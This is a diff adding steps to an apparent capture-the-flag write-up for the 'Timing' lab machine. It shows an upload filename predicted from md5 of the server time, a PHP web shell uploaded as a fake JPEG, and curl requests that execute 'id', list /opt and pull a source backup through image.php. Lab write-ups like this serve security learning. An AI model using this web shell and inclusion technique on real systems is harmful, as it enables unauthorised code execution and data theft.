@@ -356,6 +356,97 @@ Content-Type: text/html; charset=UTF-8
 }
 ````
 
+````
+nmap -p80 --script http-date timing.htb
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-06 12:25 GMT
+Nmap scan report for timing.htb (10.10.11.135)
+Host is up (0.15s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+|_http-date: Wed, 06 Apr 2022 12:25:48 GMT; 0s from local time.
+
+Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
+````
+
+set GMT timezone
+````
+$ timedatectl set-timezone GMT
+````
+
+````
+php > while (true){echo date("D M j G:i:s T Y"); echo " = " ; echo md5('$file_hash' .time());echo "\n";sleep(1);}
+Wed Apr 6 12:37:28 UTC 2022 = 2d944781afb4d24dc4ea88978b25f840
+Wed Apr 6 12:37:29 UTC 2022 = 31ff286e59c61cb2e71c51078a01f029
+Wed Apr 6 12:37:30 UTC 2022 = aaef8ef741c9541709c3eb6bece96460
+Wed Apr 6 12:37:31 UTC 2022 = 166146e84714055e2683e9f9f0c6f2ea
+Wed Apr 6 12:37:32 UTC 2022 = c5620b807fdeba2df0bf1b91e430ba8a
+Wed Apr 6 12:37:33 UTC 2022 = 9458eb2b9ba5d6044fdedb64671c5aad
+Wed Apr 6 12:37:34 UTC 2022 = d39faf2d3b032af1d76a307682527753
+Wed Apr 6 12:37:35 UTC 2022 = 7a7ff4d9e2dadde281e80d8b6285099b
+Wed Apr 6 12:37:36 UTC 2022 = 7ad0c3ca2cdd7c7eeda26ea51a482bf0
+Wed Apr 6 12:37:37 UTC 2022 = 54f3e64d22d755f9eb2e5999130a6e60
+Wed Apr 6 12:37:38 UTC 2022 = 0c369a25d4a7c2e279d0009cc9eb116e
+Wed Apr 6 12:37:39 UTC 2022 = b2179426983f2228f7e94065b789f9b9
+Wed Apr 6 12:37:40 UTC 2022 = 80a2815b52fa29ae0b1c3bafa233b611
+Wed Apr 6 12:37:41 UTC 2022 = 45ea0a047ef21fca3dd151e2b9c605aa
+Wed Apr 6 12:37:42 UTC 2022 = 9d902d40a1f97f58781e14839c793aba
+Wed Apr 6 12:37:43 UTC 2022 = 876f19973e101e6eb10e8e79ab192133
+Wed Apr 6 12:37:44 UTC 2022 = edb45c41a435012612821ca43f4043d7
+Wed Apr 6 12:37:45 UTC 2022 = 3d5064f6780a436786e9579350548cb1
+Wed Apr 6 12:37:46 UTC 2022 = 9c3db9e570eee721d32807ec21b3fb94
+Wed Apr 6 12:37:47 UTC 2022 = c1fc081534dad5ff3363afe255275333
+````
+
+````
+POST /upload.php HTTP/1.1
+Host: timing.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------365607001129933615424054169217
+Content-Length: 256
+Origin: http://timing.htb
+Connection: close
+Referer: http://timing.htb/avatar_uploader.php
+Cookie: PHPSESSID=ci5nqe80l45hbbua3v153i6gi0
+
+-----------------------------365607001129933615424054169217
+Content-Disposition: form-data; name="fileToUpload"; filename="blah.jpg"
+Content-Type: image/jpeg
+
+<?php system($_GET[cmd]);?>
+
+-----------------------------365607001129933615424054169217--
+````
+
+````
+HTTP/1.1 200 OK
+Date: Wed, 06 Apr 2022 12:37:39 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 27
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+The file has been uploaded.
+````
+
+Wed Apr 6 12:37:39 UTC 2022 = b2179426983f2228f7e94065b789f9b9
+````
+$ curl "http://timing.htb/image.php?img=images/uploads/b2179426983f2228f7e94065b789f9b9_blah.jpg&cmd=id"
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+$ curl "http://timing.htb/image.php?img=images/uploads/b2179426983f2228f7e94065b789f9b9_blah.jpg&cmd=ls+-ls+/opt"
+total 616
+616 -rw-r--r-- 1 root root 627851 Jul 20  2021 source-files-backup.zip
+
+$ curl "http://timing.htb/image.php?img=images/uploads/source-files-backup.zip" -o source-files-backup.zip
+````
+
 
 
 # User
@@ -364,4 +455,5 @@ Content-Type: text/html; charset=UTF-8
 
 # Secrets
 
-https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter
+* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter
+* https://man.sr.ht/~rek2/Hispagatos-wiki/writeups/Timing.md
